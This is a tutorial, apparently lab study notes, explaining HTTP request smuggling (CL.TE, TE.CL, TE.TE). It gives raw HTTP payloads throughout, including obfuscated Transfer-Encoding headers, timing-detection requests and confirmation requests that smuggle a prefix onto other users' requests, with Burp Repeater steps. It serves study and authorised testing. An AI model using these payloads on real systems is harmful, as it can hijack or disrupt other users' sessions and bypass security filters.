# HTTP Request Smuggling

## 1. The what and why

Imagine a website that isn't just one server — it's actually two:

```
You (browser) → Front-end server (proxy/load balancer) → Back-end server (real app)
```

The front-end takes your request and forwards it to a back-end server. To be efficient, the front-end keeps one connection open to the back-end and sends **multiple requests through it, one after another** — like packages on a conveyor belt.

<img width="652" height="318" alt="image" src="https://github.com/user-attachments/assets/a65df720-43e3-4644-a2af-3e20ecf5e77f" />

For this to work, both servers **must agree on where one request ends and the next one begins.** If they disagree, an attacker can craft a single tricky request that the front-end reads as "one request," but the back-end reads as "one request + the start of a second one." That leftover fragment gets glued onto the *next* real user's request — letting the attacker mess with it.

<img width="639" height="362" alt="image" src="https://github.com/user-attachments/assets/93c9cbf8-5d49-4adb-b6c7-167aed769229" />

This is **HTTP request smuggling**: smuggling a hidden extra request past the front-end so it lands on the back-end.

Why it's dangerous: it can bypass security filters, hijack other users' requests, steal session data, or poison how the app behaves for everyone sharing that back-end connection.

It mostly affects **HTTP/1**. Pure HTTP/2 setups are naturally immune (see note below), but plenty of sites still translate HTTP/2 down to HTTP/1 behind the scenes, which reopens the door.

---

## 2. Root cause

### Two ways to say "this is where the request ends"

HTTP/1 gives you **two different headers** to tell a server how long the request body is:

**Option A — `Content-Length`**: just says the body size in bytes.
```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

**Option B — `Transfer-Encoding: chunked`**: the body is split into chunks. Each chunk starts with its size in hex, then the data. A chunk of size `0` marks the end.
```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

> **Tip:** Burp Suite auto-unpacks chunked bodies so you may never have noticed this header. Browsers also basically never send chunked *requests* (only servers use it in responses), so a lot of people don't even know this exists on the request side.

**The conflict:** what if a request includes *both* headers, and they disagree? The spec says "ignore `Content-Length`, trust `Transfer-Encoding`." That's fine for one server — but with two servers in a chain, each one might follow a *different* rule. If the front-end and back-end pick different headers to trust, they'll disagree about where the request ends. That mismatch is the vulnerability.

This mismatch usually happens because:
- One server doesn't support `Transfer-Encoding` in requests at all, or
- One server can be tricked into *ignoring* `Transfer-Encoding` if it's written in a slightly unusual (obfuscated) way.

> **Note:** Sites that use HTTP/2 end-to-end are safe — HTTP/2 has one solid way to measure request length, no ambiguity possible. The risk comes back when a front-end speaks HTTP/2 to users but translates ("downgrades") to HTTP/1 for the back-end.

## 3. The three attack patterns

Depending on *which* header each server actually pays attention to, you get one of three scenarios:

| Name | Front-end trusts | Back-end trusts |
|---|---|---|
| **CL.TE** | `Content-Length` | `Transfer-Encoding` |
| **TE.CL** | `Transfer-Encoding` | `Content-Length` |
| **TE.TE** | Both support it, but one gets tricked into ignoring it via obfuscation |

> Note: These are HTTP/1-only tricks. Tools like Burp (and browsers) use HTTP/2 by default against servers that advertise it, so you may need to manually force HTTP/1 to test.

### 3.1 CL.TE — front-end uses Content-Length, back-end uses Transfer-Encoding

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- **Front-end** reads `Content-Length: 13` → treats everything up through `SMUGGLED` as one request body, forwards it all as-is.
- **Back-end** reads `Transfer-Encoding: chunked` → sees chunk `0` → that means "body over" immediately. The word `SMUGGLED` that follows is left dangling — the back-end treats it as the **start of the next request** in the queue.

### 3.2 TE.CL — front-end uses Transfer-Encoding, back-end uses Content-Length

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

> When testing this in Burp Repeater: turn off "Update Content-Length," and make sure you include the trailing `\r\n\r\n` after the final `0`.

- **Front-end** reads `Transfer-Encoding: chunked` → chunk `8` = 8 bytes (`SMUGGLED`), then chunk `0` = end. Forwards the whole thing.
- **Back-end** reads `Content-Length: 3` → only treats the first 3 bytes (`8\r\n`, roughly) as the body, and stops there. Everything starting from `SMUGGLED` onward is left over, waiting to be glued onto the next request.

### 3.3 TE.TE — disguising the Transfer-Encoding header

Both servers *can* understand `Transfer-Encoding`, but you disguise it so **one of them fails to recognize it** and falls back to `Content-Length` instead. Some disguises that have worked against real implementations:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

Every one of these is a tiny, spec-breaking variation. Since real-world servers are never 100% spec-compliant, different implementations tolerate different levels of "weirdness." Your job is to find a variant that only *one* of the two servers accepts — then the attack collapses into either the CL.TE or TE.CL case above, depending on which server got fooled.

## 4. Finding the vulnerability

<img width="1082" height="500" alt="image" src="https://github.com/user-attachments/assets/990c8b09-198d-47df-b178-f653678e8304" />

> **The timing trick**

The most reliable way to *detect* smuggling (without needing to fully confirm it yet) is to send a request that should leave the back-end **hanging, waiting for more data that never comes** — causing a noticeable delay in the response.

---

### 4.1 Repeater setup (before testing)

Before running the detection payloads, the request in Burp Repeater is prepped:
1. In the **Inspector** panel: downgrade the protocol to `HTTP/1.1`.
2. Change the method from `GET` to `POST`.
3. Remove unneeded headers (**OPTIONAL**).
4. In **Repeater Settings**, turn off **"Update Content-Length"**.
5. Turn on "Show non-printable characters" — this displays `\r\n` visually.
6. Send once as a sanity check — should get back `200 OK` before you start the actual tests.

---

### 4.2 Detecting CL.TE with a delay

Send a request with both headers present, where the chunked body is deliberately broken — the byte right after a valid chunk is an invalid chunk-size:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

3
ABC
X
```

- Chunk-size `3` says "3 bytes follow" → `ABC` (3 bytes) — valid.
- After that, standard chunked encoding expects the **next chunk-size line** — but what follows is `X`, not a valid hexadecimal chunk size.

**Result observed:**

1. **Delay:**
   - The front-end trusts `Content-Length: 6`, so it only forwards a truncated request — the trailing `X` gets cut off.
   - The back-end trusts `Transfer-Encoding`, processes the `3`-byte chunk (`ABC`), then sits there waiting for the next chunk that will never arrive.
   - Likely **`CL.TE`**.

2. **Immediate "Invalid request" error:**
   - The front-end is actually parsing the body as chunked — it got far enough to notice `X` isn't a valid chunk size and rejected the request right away.
   - If the front-end had ignored `Transfer-Encoding` entirely, it wouldn't have looked at chunk syntax at all.
   - Likely **front-end uses `Transfer-Encoding`** — not what this test is checking for; move to a TE-obfuscation test instead.

3. **`200 OK` normal response, no error, no delay:**
   - Both ends read exactly `Content-Length: 6` bytes as-is, with no chunk parsing on either side.
   - Not vulnerable via this payload — likely **`CL.CL`**.

---

### 4.3 Detecting TE.CL with a delay

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

- Chunk-size `0` immediately closes a valid chunked message (`0\r\n\r\n`).
- `X` sits outside that message, undelimited — with `Content-Length: 6` matching the full 6-byte body (`0\r\n\r\nX`) if read literally instead.

**Result observed:**

1. **Delay:**
   - The front-end trusts `Transfer-Encoding`, sees the `0` chunk, and considers the body finished — it never forwards the trailing `X`.
   - The back-end trusts `Content-Length: 6` and keeps waiting for the 2 bytes it's still owed.
   - Likely **`TE.CL`**.

2. **Immediate `200 OK` normal response, no error, no delay:**
   - Ambiguous on its own. Either both ends trust `Content-Length` (forwarding and reading the full 6 bytes literally, no complaints — `CL.CL`), or both trust `Transfer-Encoding` (both cleanly terminate at the `0` chunk — `TE.TE`).
   - Needs a follow-up test to tell which.

3. **Trailing `X` shows up glued onto the *next* request/response ("poisoned" connection):**
   - This means the front-end trusted `Content-Length` and forwarded the full 6 bytes (`X` included) as-is, while the back-end trusted `Transfer-Encoding`, closed the message at the `0` chunk, and left `X` as an orphaned prefix for whatever request follows.
   - This is actually **`CL.TE`**, not `TE.CL` — despite testing under the "TE.CL" payload. Easy to misclassify since it isn't a delay at all.

> **Order matters:** test CL.TE first. If a site is actually vulnerable to CL.TE and you run the TE.CL timing test first, you risk corrupting/disrupting *other users'* requests as collateral damage. Try the less-disruptive test first — and watch for outcome 2 and 3 above, since either means you're looking at a different vulnerability class than the one this payload is nominally testing for.

## 5. Confirming

> **Prove it by messing with someone else's response**

A delay is a strong hint, but not full proof. To *confirm*, you exploit the smuggling to actually corrupt a follow-up request, and watch for a telltale broken response.

**Method:** fire two requests back-to-back on the same connection:
1. An **attack request** — crafted to leave a dangling fragment.
2. A **normal request** — the thing you expect to get corrupted.

If the normal request's response shows signs of interference (e.g., an unexpected 404), the vulnerability is real.

Say the normal request looks like this, and usually returns `200 OK` with search results:
```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

### 5.1 Confirming CL.TE

Send this attack request first:
```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

If it works, the back-end stitches `GET /404 ... Foo: x` onto the front of the next request it receives — turning the innocent "normal" request into something like:

```http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

That's now a request for a bogus `/404` path, so the response comes back as `404 Not Found` instead of the expected `200` — proof the attack request tampered with it.

### 5.2 Confirming TE.CL

Send this attack request first:
```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

```

> Same Burp Repeater setup as before: disable "Update Content-Length," and keep the trailing `\r\n\r\n` after the last `0`.

**Where `7c` actually came from**:
- `7c` (hex) = `124` (decimal). That number is correct only for the original PortSwigger lab payload, which smuggled a longer inner request:
```http
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
```

- **The chunk-size (read by the front-end) must match the exact byte count of the chunk's contents.**
- **Counts only up to `x=`, without a trailing `\r\n` after it**
- **Remember to disable "Update Content-Length," and keep the trailing `\r\n\r\n` after the last `0`**

If it works, everything from `GET /404` onward gets tacked onto the next request, producing something like:

```http
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Again — bogus `/404` path → unexpected `404` response → confirms the smuggling worked.

### Ground rules for this confirmation test

- **Use two separate connections** — one for the attack request, one for the normal request. Sending both over the `same connection` doesn't prove anything.
- **Keep the `URL` and `parameters` identical** between attack and normal requests — many apps route to different back-ends based on URL/params, so matching them increases the odds both land on the same back-end server.
- **It's a race.** Real traffic from other users is flowing through at the same time. Send the "normal" request immediately after the attack request, and be ready to retry a few times.
- **Load balancing can defeat you.** If the attack and normal requests get routed to *different* back-end servers, the test will fail — another reason to retry.
- **Be careful of collateral damage.** If your attack request ends up corrupting some *other* real user's request instead of your own "normal" one, that user is now affected by your test. Don't hammer this repeatedly on a live target — it can genuinely disrupt other people's sessions.
